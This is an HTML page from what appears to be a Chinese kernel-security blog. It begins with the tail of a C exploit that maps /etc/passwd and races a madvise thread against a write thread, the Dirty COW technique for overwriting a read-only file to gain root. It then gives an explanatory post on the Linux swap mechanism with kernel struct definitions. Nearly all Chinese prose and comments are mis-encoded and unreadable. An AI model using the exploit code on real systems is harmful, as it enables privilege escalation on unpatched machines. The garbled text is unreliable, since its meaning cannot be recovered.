class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">int</span> file_size;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    </span><br><span class="line">    fstat(f, &amp;st);</span><br><span class="line">    file_size = st.st_size;</span><br><span class="line">    <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;yhellow&quot;</span>); <span class="comment">/* ÊâæÂà∞ÂØπÂ∫îÁöÑÁî®Êà∑Âêç‰ΩçÁΩÆ */</span></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="keyword">void</span> *)file_size); </span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position); </span><br><span class="line">    </span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/16/Linux%20Swap%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/16/Linux%20Swap%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">Linux SwapÊú∫Âà∂</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-16 22:49:11" itemprop="dateCreated datePublished" datetime="2022-11-16T22:49:11+08:00">2022-11-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-22 01:22:46" itemprop="dateModified" datetime="2022-11-22T01:22:46+08:00">2022-11-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Linux SwapÊú∫Âà∂</strong></p>
<p>Âú® Linux ‰∏ãÔºåÂΩìÁâ©ÁêÜÂÜÖÂ≠ò‰∏çË∂≥Êó∂ÔºåÊãøÂá∫ÈÉ®ÂàÜÁ°¨ÁõòÁ©∫Èó¥ÂΩì Swap ÂàÜÂå∫Ôºà‰πüË¢´Áß∞‰∏∫‚ÄúËôöÊãüÂÜÖÂ≠ò‚ÄùÔºå‰ªéÁ°¨Áõò‰∏≠ÂàíÂàÜÂá∫ÁöÑ‰∏Ä‰∏™ÂàÜÂå∫ÔºâÔºå‰ªéËÄåËß£ÂÜ≥ÂÜÖÂ≠òÂÆπÈáè‰∏çË∂≥ÁöÑÊÉÖÂÜµ</p>
<ul>
<li>Swap ÊÑèÊÄùÊòØ‰∫§Êç¢Ôºå ÂΩìÁâ©ÁêÜÂÜÖÂ≠ò‰∏çÂ§üÁî®ÁöÑÊó∂ÂÄôÔºåÂÜÖÊ†∏Â∞±‰ºöÈáäÊîæÁºìÂ≠òÂå∫Ôºàbuffers/cacheÔºâÈáå‰∏Ä‰∫õÈïøÊó∂Èó¥‰∏çÁî®ÁöÑÁ®ãÂ∫èÔºåÁÑ∂ÂêéÂ∞ÜËøô‰∫õÁ®ãÂ∫è‰∏¥Êó∂ÊîæÂà∞ Swap ‰∏≠ </li>
<li>Swap OutÔºöÂΩìÊüêËøõÁ®ãÂêëOSËØ∑Ê±ÇÂÜÖÂ≠òÂèëÁé∞‰∏çË∂≥Êó∂ÔºåOS‰ºöÊääÂÜÖÂ≠ò‰∏≠ÊöÇÊó∂‰∏çÁî®ÁöÑÊï∞ÊçÆ‰∫§Êç¢Âá∫ÂéªÔºåÊîæÂú® SWAP ÂàÜÂå∫‰∏≠</li>
<li>Swap InÔºöÂΩìÊüêËøõÁ®ãÂèàÈúÄË¶ÅËøô‰∫õÊï∞ÊçÆ‰∏îOSÂèëÁé∞ËøòÊúâÁ©∫Èó≤Áâ©ÁêÜÂÜÖÂ≠òÊó∂ÔºåÂèà‰ºöÊää Swap ÂàÜÂå∫‰∏≠ÁöÑÊï∞ÊçÆ‰∫§Êç¢ÂõûÁâ©ÁêÜÂÜÖÂ≠ò‰∏≠</li>
</ul>
<p>Linux Êìç‰ΩúÁ≥ªÁªü‰ΩøÁî®Â¶Ç‰∏ãËøôÂá†ÁßçÊú∫Âà∂Êù•Ê£ÄÊü•Á≥ªÁªüÂÜÖÂ≠òÊòØÂê¶ÈúÄË¶ÅËøõË°åÈ°µÈù¢ÂõûÊî∂Ôºö</p>
<ul>
<li>Âë®ÊúüÂõûÊî∂Ôºö<ul>
<li>ËøôÊòØÁî±ÂêéÂè∞ËøêË°åÁöÑÂÆàÊä§ËøõÁ®ã kswapd ÂÆåÊàêÁöÑ</li>
<li>ËØ•ËøõÁ®ãÂÆöÊúüÊ£ÄÊü•ÂΩìÂâçÁ≥ªÁªüÁöÑÂÜÖÂ≠ò‰ΩøÁî®ÊÉÖÂÜµÔºåÂΩìÂèëÁé∞Á≥ªÁªüÂÜÖÁ©∫Èó≤ÁöÑÁâ©ÁêÜÈ°µÈù¢Êï∞ÁõÆÂ∞ë‰∫éÁâπÂÆöÁöÑÈòàÂÄºÊó∂ÔºåËØ•ËøõÁ®ãÂ∞±‰ºöÂèëËµ∑È°µÈù¢ÂõûÊî∂ÁöÑÊìç‰Ωú</li>
</ul>
</li>
<li>ÂÜÖÂ≠òÁ¥ßÁº∫ÂõûÊî∂Ôºö<ul>
<li>Êìç‰ΩúÁ≥ªÁªüÂøΩÁÑ∂ÈúÄË¶ÅÈÄöËøá‰ºô‰º¥Á≥ªÁªü‰∏∫Áî®Êà∑ËøõÁ®ãÂàÜÈÖç‰∏ÄÂ§ßÂùóÂÜÖÂ≠òÔºåÊàñËÄÖÈúÄË¶ÅÂàõÂª∫‰∏Ä‰∏™ÂæàÂ§ßÁöÑÁºìÂÜ≤Âå∫ÔºåËÄåÂΩìÊó∂Á≥ªÁªü‰∏≠ÁöÑÂÜÖÂ≠òÊ≤°ÊúâÂäûÊ≥ïÊèê‰æõË∂≥Â§üÂ§öÁöÑÁâ©ÁêÜÂÜÖÂ≠ò‰ª•Êª°Ë∂≥ËøôÁßçÂÜÖÂ≠òËØ∑Ê±Ç</li>
<li>ËøôÊó∂ÂÄôÔºåÊìç‰ΩúÁ≥ªÁªüÂ∞±ÂøÖÈ°ªÂ∞ΩÂø´ËøõË°åÈ°µÈù¢ÂõûÊî∂Êìç‰ΩúÔºå‰ª•‰æøÈáäÊîæÂá∫‰∏Ä‰∫õÂÜÖÂ≠òÁ©∫Èó¥‰ªéËÄåÊª°Ë∂≥‰∏äËø∞ÁöÑÂÜÖÂ≠òËØ∑Ê±Ç</li>
<li>ËøôÁßçÈ°µÈù¢ÂõûÊî∂ÊñπÂºè‰πüË¢´Áß∞‰Ωú‚ÄúÁõ¥Êé•È°µÈù¢ÂõûÊî∂‚Äù</li>
</ul>
</li>
<li>Áù°Áú†ÂõûÊî∂Ôºö<ul>
<li>Âú®ËøõÁ®ãËøõÂÖ• <code>suspend-to-disk</code>Ôºà‰ºëÁú†ÔºâÁä∂ÊÄÅÊó∂ÔºåÂÜÖÊ†∏ÂøÖÈ°ªÈáäÊîæÂÜÖÂ≠ò</li>
</ul>
</li>
</ul>
<p>Â¶ÇÊûú Linux Âú®ËøõË°å‰∫ÜÂÜÖÂ≠òÂõûÊî∂Êìç‰Ωú‰πãÂêé‰ªçÁÑ∂Êó†Ê≥ïÂõûÊî∂Âà∞Ë∂≥Â§üÂ§öÁöÑÈ°µÈù¢‰ª•Êª°Ë∂≥‰∏äËø∞ÂÜÖÂ≠òË¶ÅÊ±ÇÔºåÈÇ£‰πàÊìç‰ΩúÁ≥ªÁªüÂè™ÊúâÊúÄÂêé‰∏Ä‰∏™ÈÄâÊã©ÔºåÈÇ£Â∞±ÊòØ‰ΩøÁî® OOM(out of memory) killerÔºåÂÆÉ‰ªéÁ≥ªÁªü‰∏≠ÊåëÈÄâ‰∏Ä‰∏™ÊúÄÂêàÈÄÇÁöÑËøõÁ®ãÊùÄÊ≠ªÂÆÉÔºåÂπ∂ÈáäÊîæËØ•ËøõÁ®ãÊâÄÂç†Áî®ÁöÑÊâÄÊúâÈ°µÈù¢</p>
<p>Linux ÂÜÖÊ†∏ÁöÑÈ°µÈù¢ÂõûÊî∂ÁÆóÊ≥ï‰∏∫ PFRA</p>
<ul>
<li>PFRA ÈááÂèñ‰ªéÁî®Êà∑ÊÄÅËøõÁ®ãÂíåÂÜÖÊ†∏È´òÈÄüÁºìÂ≠ò‚ÄúÁ™ÉÂèñ‚ÄùÈ°µÊ°ÜÁöÑÂäûÊ≥ïË°•ÂÖÖ‰ºô‰º¥Á≥ªÁªüÁöÑÁ©∫Èó≤ÂùóÂàóË°®</li>
<li>PFRA ÁöÑÁõÆÊ†á‰πã‰∏ÄÂ∞±ÊòØ‰øùÂ≠òÊúÄÂ∞ëÁöÑÁ©∫Èó≤È°µÂà∞Á£ÅÁõòÔºå‰ª•‰æøÂÜÖÊ†∏ÂèØ‰ª•ÂÆâÂÖ®Âú∞‰ªé‚ÄúÂÜÖÂ≠òÁ¥ßÁº∫‚ÄùÁöÑÊÉÖÂΩ¢‰∏≠ÊÅ¢Â§çËøáÊù•</li>
</ul>
<p>PFRA ÈúÄË¶ÅÂÅöÁöÑÁ¨¨‰∏Ä‰ª∂‰∫ãÊÉÖÂ∞±ÊòØÊòéÁ°ÆÔºöÂì™‰∫õÈ°µÈù¢ÂèØ‰ª•Ë¢´ SwapÔºåÂì™‰∫õÂèà‰∏çËÉΩ</p>
<p>‰∫éÊòØ PFRA ÊåâÁÖßÈ°µÊ°ÜÊâÄÂê´ÂÜÖÂÆπÔºå‰ª•‰∏çÂêåÁöÑÊñπÂºèÂ§ÑÁêÜÈ°µÊ°ÜÔºö</p>
<ul>
<li>‰∏çÂèØÂõûÊî∂È°µÔºö‰∏çÂÖÅËÆ∏‰πüÊó†ÈúÄÂõûÊî∂<ul>
<li>Á©∫Èó≤È°µÔºàÂåÖÂê´Âú®Â≠ê‰ºô‰º¥Á≥ªÁªüË°®Âàó‰∏≠Ôºâ</li>
<li>‰øùÁïôÈ°µÔºàPG_reserved Ê†áÂøóÁΩÆ‰ΩçÔºâ</li>
<li>ÂÜÖÊ†∏Âä®ÊÄÅÂàÜÈÖçÈ°µ</li>
<li>ËøõÁ®ãÂÜÖÊ†∏ÊÄÅÂ†ÜÊ†àÈ°µ</li>
<li>‰∏¥Êó∂ÈîÅÂÆöÈ°µÔºàPG_locked Ê†áÂøóÁΩÆ‰ΩçÔºâ</li>
<li>ÂÜÖÂ≠òÈîÅÂÆöÈ°µÔºàVM_LOCKED Ê†áÂøóÁΩÆ‰ΩçÔºåÂπ∂‰∏îÂú®ÂÖàË°åÂå∫‰∏≠Ôºâ</li>
</ul>
</li>
<li>ÂèØÂõûÊî∂È°µÔºöÂèØ‰ª•Â∞ÜËØ•È°µÁöÑÂÜÖÂ≠ò‰øùÂ≠òÂú® Swap ‰∫§Êç¢Âå∫Ôºà‰Ωú‰∏∫ ‚ÄúËôöÊãüÂÜÖÂ≠ò‚Äù ÁöÑÁ£ÅÁõòÂå∫ÂüüÔºâ<ul>
<li>Áî®Êà∑ÊÄÅÂú∞ÂùÄÁ©∫Èó¥ÁöÑÂåøÂêçÈ°µ</li>
<li>tmpfs Êñá‰ª∂Á≥ªÁªüÁöÑÊò†Â∞ÑÈ°µÔºà‰æãÂ¶ÇÔºöPOSIX Êé•Âè£‰∏≠ IPC ÂÖ±‰∫´ÂÜÖÂ≠òÁöÑÈ°µÔºâ</li>
</ul>
</li>
<li>ÂèØÂêåÊ≠•È°µÔºöÂøÖË¶ÅÊó∂Ôºå‰∏éÁ£ÅÁõòÈïúÂÉèÂêåÊ≠•Ëøô‰∫õÈ°µ<ul>
<li>Áî®Êà∑ÊÄÅÂú∞ÂùÄÁ©∫Èó¥ÁöÑÊò†Â∞ÑÈ°µ</li>
<li>Â≠òÊúâÁ£ÅÁõòÊñá‰ª∂Êï∞ÊçÆÔºåÂπ∂‰∏îÂú®È°µÈ´òÈÄüÁºìÂ≠ò‰∏≠ÁöÑÈ°µ</li>
<li>ÂùóËÆæÂ§áÁºìÂÜ≤Âå∫È°µ</li>
<li>Êüê‰∫õÁ£ÅÁõòÁöÑÈ´òÈÄüÁºìÂ≠òÈ°µÔºà‰æãÂ¶ÇÔºöÁ¥¢ÂºïËäÇÁÇπÈ´òÈÄüÁºìÂ≠òÔºâ</li>
</ul>
</li>
<li>ÂèØ‰∏¢ÂºÉÈ°µÔºöÊó†ÈúÄÊìç‰Ωú<ul>
<li>ÂÜÖÂ≠òÈ´òÈÄüÁºìÂ≠ò‰∏≠ÁöÑÊú™‰ΩøÁî®È°µÔºà‰æãÂ¶ÇÔºöSlab ÂàÜÈÖçÂô®È´òÈÄüÁºìÂ≠òÔºâ</li>
<li>ÁõÆÂΩï‰∏≠È´òÈÄüÁºìÂ≠òÁöÑÊú™‰ΩøÁî®È°µ</li>
</ul>
</li>
</ul>
<p><strong>Swap Âü∫Á°ÄÁªìÊûÑ</strong></p>
<p>ÊØè‰∏Ä‰∏™Ê¥ªÂä®ÁöÑ‰∫§Êç¢Âå∫ÈÉΩ‰ºöÁî±‰∏Ä‰∏™ <code>swap_info_struct</code> ÁªìÊûÑ‰ΩìËøõË°åÊèèËø∞Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">swap_info_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	flags;		<span class="comment">/* SWP_USED etc: see above */</span></span><br><span class="line">	<span class="keyword">signed</span> <span class="keyword">short</span>	prio;		<span class="comment">/* swap priority of this type */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span> <span class="title">list</span>;</span>		<span class="comment">/* entry in swap_active_head */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span> <span class="title">avail_lists</span>[<span class="title">MAX_NUMNODES</span>];</span><span class="comment">/* entry in swap_avail_heads */</span></span><br><span class="line">	<span class="keyword">signed</span> <span class="keyword">char</span>	type;		<span class="comment">/* strange name for an index */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	max;		<span class="comment">/* extent of the swap_map */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *swap_map;	<span class="comment">/* ‰∏Ä‰∏™ÈùûÂ∏∏Â§ßÁöÑÊï∞ÁªÑ,ÂÖ∂‰∏≠ÁöÑÊØèÈ°πÈÉΩÂØπÂ∫î‰∫Ü‰∏Ä‰∏™‰∫§Êç¢Âå∫ÁöÑ‰∏Ä‰∏™ÊßΩ(‰∫§Êç¢È°π)ÁöÑÂºïÁî®ËÆ°Êï∞ */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_cluster_info</span> *<span class="title">cluster_info</span>;</span> <span class="comment">/* cluster info. Only for SSD */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_cluster_list</span> <span class="title">free_clusters</span>;</span> <span class="comment">/* free clusters list */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> lowest_bit;	<span class="comment">/* index of first free in swap_map */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> highest_bit;	<span class="comment">/* index of last free in swap_map */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> pages;		<span class="comment">/* total of usable pages of swap */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse_pages;	<span class="comment">/* number of those currently in use */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cluster_next;	<span class="comment">/* ‰∫§Êç¢Êñá‰ª∂ÂΩìÂâçÁöÑÂÅèÁßªÈáè */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cluster_nr;	<span class="comment">/* ‰∫§Êç¢Âå∫‰∏≠Â∑≤ÁªèÂàÜÈÖçÁöÑÈ°µÈù¢Êï∞ */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">percpu_cluster</span> __<span class="title">percpu</span> *<span class="title">percpu_cluster</span>;</span> <span class="comment">/* per cpu&#x27;s swap location */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_extent</span> *<span class="title">curr_swap_extent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_extent</span> <span class="title">first_swap_extent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">bdev</span>;</span>	<span class="comment">/* swap device or bdev of swap file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">swap_file</span>;</span>		<span class="comment">/* seldom referenced */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> old_block_size;	<span class="comment">/* seldom referenced */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FRONTSWAP</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *frontswap_map;	<span class="comment">/* frontswap in-use, one bit per page */</span></span><br><span class="line">	<span class="keyword">atomic_t</span> frontswap_pages;	<span class="comment">/* frontswap pages in-use counter */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">spinlock_t</span> lock;		<span class="comment">/*</span></span><br><span class="line"><span class="comment">					 * protect map scan related fields like</span></span><br><span class="line"><span class="comment">					 * swap_map, lowest_bit, highest_bit,</span></span><br><span class="line"><span class="comment">					 * inuse_pages, cluster_next,</span></span><br><span class="line"><span class="comment">					 * cluster_nr, lowest_alloc,</span></span><br><span class="line"><span class="comment">					 * highest_alloc, free/discard cluster</span></span><br><span class="line"><span class="comment">					 * list. other fields are only changed</span></span><br><span class="line"><span class="comment">					 * at swapon/swapoff, so are protected</span></span><br><span class="line"><span class="comment">					 * by swap_lock. changing flags need</span></span><br><span class="line"><span class="comment">					 * hold this lock and swap_lock. If</span></span><br><span class="line"><span class="comment">					 * both locks need hold, hold swap_lock</span></span><br><span class="line"><span class="comment">					 * first.</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> cont_lock;		<span class="comment">/*</span></span><br><span class="line"><span class="comment">					 * protect swap count continuation page</span></span><br><span class="line"><span class="comment">					 * list.</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">discard_work</span>;</span> <span class="comment">/* discard worker */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_cluster_list</span> <span class="title">discard_clusters</span>;</span> <span class="comment">/* discard clusters list */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Á≥ªÁªü‰ºöÊääËøô‰∫õ <code>swap_info_struct</code> Â≠òÊîæÂú®‰∏Ä‰∏™ <code>swap_info</code> Êï∞ÁªÑ‰∏≠Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">swap_info_struct</span> *<span class="title">swap_info</span>[<span class="title">MAX_SWAPFILES</span>];</span></span><br></pre></td></tr></table></figure>
<p>ÊØè‰∏™‰∫§Êç¢Âå∫Âú®Á£ÅÁõò‰∏äÈÉΩÂàíÂàÜÂá∫Â§ßÈáè‰∏ÄÈ°µÂ§ßÂ∞èÁöÑÊßΩÔºåÁ¨¨‰∏Ä‰∏™ÊßΩÂ≠òÊîæÊúâ‰∫§Êç¢Âå∫ÁöÑÂü∫Êú¨‰ø°ÊÅØÔºåÂú®ÂÜÖÊ†∏‰∏≠Áî±‰∏Ä‰∏™ <code>swap_header</code> ËÅîÂêà‰ΩìËøõË°åË°®Á§∫Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">swap_header</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">char</span> reserved[PAGE_SIZE - <span class="number">10</span>];</span><br><span class="line">		<span class="keyword">char</span> magic[<span class="number">10</span>];			<span class="comment">/* SWAP-SPACE or SWAPSPACE2 */</span></span><br><span class="line">	&#125; magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">char</span>		bootbits[<span class="number">1024</span>];	<span class="comment">/* Space for disklabel etc. */</span></span><br><span class="line">		__u32		version;</span><br><span class="line">		__u32		last_page;</span><br><span class="line">		__u32		nr_badpages;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span>	sws_uuid[<span class="number">16</span>];</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span>	sws_volume[<span class="number">16</span>];</span><br><span class="line">		__u32		padding[<span class="number">117</span>];</span><br><span class="line">		__u32		badpages[<span class="number">1</span>];</span><br><span class="line">	&#125; info;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Linux Â∞ÜÁ£ÅÁõò‰∏≠ÁöÑ SWAPFILE_CLUSTER ‰∏™È°µÂàÜÈÖçÂà∞‰∏Ä‰∏™Á∞á‰∏≠</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_THP_SWAP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPFILE_CLUSTER	HPAGE_PMD_NR</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swap_entry_size(size)	(size)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPFILE_CLUSTER	256</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Âú® <code>swap_info_struct-&gt;cluster_nr</code> ‰∏≠ËÆ∞ÂΩï‚Äú‰∫§Êç¢Âå∫‰∏≠Â∑≤ÁªèÂàÜÈÖçÁöÑÈ°µÈù¢Êï∞‚Äù</li>
<li>Âú® <code>swap_info_struct-&gt;cluster_next</code> ‰∏≠ËÆ∞ÂΩï‚Äú‰∫§Êç¢Êñá‰ª∂ÂΩìÂâçÁöÑÂÅèÁßªÈáè‚Äù</li>
</ul>
<p><strong>Êò†Â∞ÑÈ°µË°®È°πÂà∞‰∫§Êç¢Âå∫</strong></p>
<p>ÂΩì‰∏Ä‰∏™È°µÈù¢Ë¢´‰∫§Êç¢Âá∫Êó∂ÔºåLinux ‰ΩøÁî®Áõ∏Â∫îÁöÑÈ°µË°®È°π PTE Êù•Â≠òÊîæÁî®‰∫éÂÜçÊ¨°‰ªéÁ£ÅÁõò‰∏äÂÆö‰ΩçËØ•È°µÁöÑ‰ø°ÊÅØÔºö</p>
<ul>
<li>PTE Êú¨Ë∫´‰∏çËÉΩÁõ¥Êé•Á≤æÂáÜ‰øùÂ≠ò‰∫§Êç¢È°µÈù¢ÁöÑ‰ΩçÁΩÆ‰ø°ÊÅØ</li>
<li>PTE Âè™ÈúÄË¶ÅÂ≠òÊîæ‰∫§Êç¢ÊßΩÂú® <code>swap_info</code> Êï∞ÁªÑÁöÑ‰∏ãÊ†áÔºå‰ª•ÂèäÂú® <code>swap_map</code> ‰∏≠ÁöÑÂÅèÁßªÈáè</li>
</ul>
<p>ÈÄöËøáÂ¶Ç‰∏ã‰∏§‰∏™ÂáΩÊï∞ËøõË°åËΩ¨Êç¢Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">swp_entry_t</span> <span class="title">pte_to_swp_entry</span><span class="params">(<span class="keyword">pte_t</span> pte)</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">pte_t</span> <span class="title">swp_entry_to_pte</span><span class="params">(<span class="keyword">swp_entry_t</span> entry)</span></span></span><br></pre></td></tr></table></figure>
<p><strong>‰∫§Êç¢Âå∫È´òÈÄüÁºìÂ≠ò Swap Tcache</strong></p>
<p>Linux Êó†Ê≥ïÂø´ÈÄüÂÆåÊàê‰ªé PTE ÂºïÁî®Âà∞È°µÈù¢ÁªìÊûÑÁöÑËΩ¨ÂåñÔºåÂõ†Ê≠§ÔºåÂ§öÁ∫øÁ®ãÂÖ±‰∫´È°µÈù¢‰∏çËÉΩÁÆÄÂçïÂú∞ÂèñÂá∫</p>
<p>‰∏∫‰∫ÜËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºåÂÖ±‰∫´È°µ‰ºöÂú®ÂÜÖÂ≠ò‰∏≠‰øùÁïô‰∏Ä‰∏™ÊßΩÔºå‰Ωú‰∏∫È´òÈÄüÁºìÂ≠òÁöÑ‰∏ÄÈÉ®ÂàÜ</p>
<p><strong>Linux ÂõûÊî∂Âπ≥Ë°°</strong></p>
<p>Linux È°µÈù¢ÂõûÊî∂ÔºåÂπ∂‰∏çÊòØÂõûÊî∂ÂæóË∂äÂ§öË∂äÂ•ΩÔºåËÄåÊòØÂäõÊ±ÇËææÂà∞‰∏ÄÁßçÂπ≥Ë°°ÔºàÂÜÖÂ≠ò Swap ÊòØÈúÄË¶Å‰ª£‰ª∑ÁöÑÔºâ</p>
<p>Áâ©ÁêÜÂÜÖÂ≠òÂú® Kernel ‰∏≠‰∏ªË¶ÅÊúâËøô‰πàÂá†‰∏™Â±ÇÊ¨°ÁöÑÂàíÂàÜÔºö</p>
<ul>
<li>ÂÖ®‰ΩìÂÜÖÂ≠ò</li>
<li>‰∏Ä‰∏™ NUMA ËäÇÁÇπÁöÑÂÜÖÂ≠ò</li>
<li>‰∏Ä‰∏™ NUMA ËäÇÁÇπ‰∏≠ÁöÑ‰∏Ä‰∏™ zone ÁöÑÂÜÖÂ≠ò </li>
</ul>
